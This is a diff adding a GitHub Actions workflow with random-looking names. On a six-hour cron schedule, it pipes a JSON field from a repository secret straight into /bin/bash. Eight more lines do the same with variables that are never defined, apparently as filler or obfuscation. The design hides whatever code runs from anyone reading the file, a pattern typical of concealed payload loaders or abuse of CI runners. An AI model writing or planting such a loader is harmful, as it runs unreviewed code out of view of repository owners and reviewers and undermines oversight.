@@ -1,0 +1,26 @@
+name: huakkc
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huakkc
+        env:
+          gcx9808: ${{ secrets.gcx9808 }}
+        run: |
+          echo $gcx9808 | jq -r .nc5 | /bin/bash
+          echo $vn11 | jq -r .zpdge481 | /bin/bash
+          echo $tobu818 | jq -r .tu596 | /bin/bash
+          echo $k6458 | jq -r .n0 | /bin/bash
+          echo $umxw6 | jq -r .bq30576 | /bin/bash
+          echo $whbkm16 | jq -r .vt25694 | /bin/bash
+          echo $v23944 | jq -r .ox83895 | /bin/bash
+          echo $nnzqm78653 | jq -r .skog534 | /bin/bash
+          echo $uh071 | jq -r .i64639 | /bin/bash
+
